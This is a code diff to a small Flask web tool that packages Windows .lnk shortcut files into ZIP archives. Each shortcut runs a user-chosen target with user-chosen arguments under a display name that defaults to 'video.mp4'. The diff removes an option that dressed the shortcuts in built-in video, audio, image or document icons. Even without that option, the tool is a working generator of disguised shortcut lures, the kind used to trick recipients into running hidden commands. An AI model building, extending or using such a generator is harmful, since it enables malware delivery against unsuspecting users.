@@ -26,11 +26,9 @@ except ImportError:
     _HAS_PYLNK3 = False
 
 
-def _build_lnk(target: str, arguments: str = "", icon_path: str = "", icon_index: int = 0) -> bytes:
+def _build_lnk(target: str, arguments: str = "") -> bytes:
     """
-    Build a .lnk file. icon_path must be an absolute path or contain
-    environment variables (e.g. "%SystemRoot%\\System32\\imageres.dll").
-    icon_index is the resource index (negative for resource IDs).
+    Build a .lnk file with target and optional arguments.
     """
     if _HAS_LNKSMITH:
         kwargs = {"target": target}
@@ -41,15 +39,6 @@ def _build_lnk(target: str, arguments: str = "", icon_path: str = "", icon_index
         if arguments and "arguments" in _LNKSMITH_PARAMS:
             kwargs["arguments"] = arguments
 
-        if icon_path:
-            if "icon_env" in _LNKSMITH_PARAMS:
-                kwargs["icon_env"] = icon_path
-                if "icon_index" in _LNKSMITH_PARAMS:
-                    kwargs["icon_index"] = icon_index
-            elif "icon" in _LNKSMITH_PARAMS:
-                # Fallback for older lnksmith versions that combine path and index
-                kwargs["icon"] = f"{icon_path},{icon_index}"
-
         return build_lnk(**kwargs)
 
     if _HAS_PYLNK3:
@@ -57,8 +46,6 @@ def _build_lnk(target: str, arguments: str = "", icon_path: str = "", icon_index
         lnk.path = target
         if arguments:
             lnk.arguments = arguments
-        if icon_path:
-            lnk.icon = f"{icon_path},{icon_index}"
         buf = io.BytesIO()
         lnk.save(buf)
         return buf.getvalue()
@@ -87,23 +74,11 @@ def _sanitize_zip_name(raw: str, fallback: str) -> str:
     return name
 
 
-# Built-in portable icons: (path, index). Paths contain %env% vars.
-# Resource IDs (negative numbers) are stable across Windows 10/11.
-ICON_MAP = {
-    "video":    ("%SystemRoot%\\System32\\imageres.dll", -189),  # Videos folder
-    "audio":    ("%SystemRoot%\\System32\\imageres.dll", -108),  # Music folder
-    "image":    ("%SystemRoot%\\System32\\imageres.dll", -113),  # Pictures folder
-    "document": ("%SystemRoot%\\System32\\imageres.dll", -112),  # Documents folder
-    "none":     ("", 0),
-}
-
-
 @app.route("/api/generate", methods=["POST"])
 def generate():
     target = (request.form.get("target") or "").strip()
     args = (request.form.get("args") or "").strip()
     display = (request.form.get("display") or "video.mp4").strip()
-    icon_style = (request.form.get("icon_style") or "video").strip().lower()
     zip_name_raw = (request.form.get("zip_name") or "").strip()
 
     if not target:
@@ -116,10 +91,8 @@ def generate():
     zip_base = _sanitize_zip_name(zip_name_raw, display)
     zip_filename = zip_base + ".zip"
 
-    icon_path, icon_index = ICON_MAP.get(icon_style, ("", 0))
-
     try:
-        lnk_bytes = _build_lnk(target, args, icon_path, icon_index)
+        lnk_bytes = _build_lnk(target, args)
     except Exception as e:
         return jsonify({"error": "lnk build failed: " + str(e)}), 500
 
@@ -202,16 +175,15 @@ _HTML = r"""<!DOCTYPE html>
     display: block; margin: 1.1rem 0 0.4rem; font-size: 0.72rem;
     text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted);
   }
-  input[type="text"], select {
+  input[type="text"] {
     width: 100%; padding: 0.6rem 0.75rem; background: var(--surface-2);
     border: 1px solid var(--border); border-radius: 8px; color: var(--text);
     font-family: inherit; font-size: 0.85rem; transition: border-color 0.15s;
   }
-  input[type="text"]:focus, select:focus {
+  input[type="text"]:focus {
     outline: none; border-color: var(--accent);
     box-shadow: 0 0 0 3px rgba(124,92,255,0.15);
   }
-  select { cursor: pointer; }
   button {
     margin-top: 1.75rem; width: 100%; padding: 0.85rem 1.5rem;
     font-size: 0.85rem; font-family: inherit; letter-spacing: 0.08em;
@@ -253,16 +225,6 @@ _HTML = r"""<!DOCTYPE html>
   <input type="text" id="zipName" value="video" spellcheck="false">
   <div class="hint">Leave empty to reuse display name. Illegal characters stripped server-side.</div>
 
-  <label for="iconStyle">Icon style (built-in, portable)</label>
-  <select id="iconStyle">
-    <option value="video" selected>Video file</option>
-    <option value="audio">Audio file</option>
-    <option value="image">Image file</option>
-    <option value="document">Document</option>
-    <option value="none">No icon (default target icon)</option>
-  </select>
-  <div class="hint">Icons are sourced from <code>%SystemRoot%\System32\imageres.dll</code> and exist on all Windows installations.</div>
-
   <button id="generateBtn">Generate ZIP</button>
   <div id="status"></div>
 
@@ -292,7 +254,6 @@ document.getElementById('generateBtn').addEventListener('click', async () => {
     form.append('args', document.getElementById('args').value.trim());
     form.append('display', displayEl.value.trim() || 'video.mp4');
     form.append('zip_name', zipNameEl.value.trim());
-    form.append('icon_style', document.getElementById('iconStyle').value);
 
     if (!form.get('target')) {
       status.className = 'error';
